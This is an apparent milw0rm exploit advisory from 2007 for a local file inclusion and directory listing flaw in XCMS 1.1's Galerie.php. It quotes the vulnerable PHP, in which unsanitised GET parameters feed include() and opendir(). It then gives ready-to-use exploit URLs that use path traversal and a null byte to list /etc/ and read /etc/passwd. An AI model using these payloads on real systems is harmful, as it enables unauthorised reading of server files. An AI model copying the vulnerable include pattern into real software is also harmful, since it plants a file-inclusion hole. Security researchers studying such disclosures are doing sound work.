<html><head><title>XCMS 1.1 (Galerie.php) Local File Inclusion Vulnerabilities</title></head><pre>#Author::   BlackNDoor | blackndoor@learntohell.net
#Homepage:: www.learntohell.net
#
#Script::   XCMS : CMS
#Version::  1.1
#Type::     Remote Directory Listing &amp; Local File Include
#
#Source::   http://groupeclan.free.fr/XCMS.zip

#Bug::
   -&gt; Files:

      /Module/Galerie.php.php

   -&gt; vulncode:

      if(!isset($_GET['Lang'])) { $Lang=&quot;fr&quot;; } else { $Lang=$_GET['Lang']; }
      if(!isset($_GET['Ent'])) { $Ent='false'; } else { $Ent=$_GET['Ent']; }
      include('Lang/' . $Lang . '.lang');  &lt;--- Local File Include
      if($Ent)
      {
	$Nb = -1;
	$Dossier = opendir(&quot;../Images/$Lang/$Ent&quot;);  &lt;--- Directory Listing


#Exploit::

   http://www.site.com/[path to XCMS]/Module/Galerie.php?Ent=../../../../../../etc/
   http://www.site.com/[path to XCMS]/Module/Galerie.php?Lang=../../../../../../etc/passwd%00

#thanks:: str0ke

# milw0rm.com [2007-06-30]</pre></html>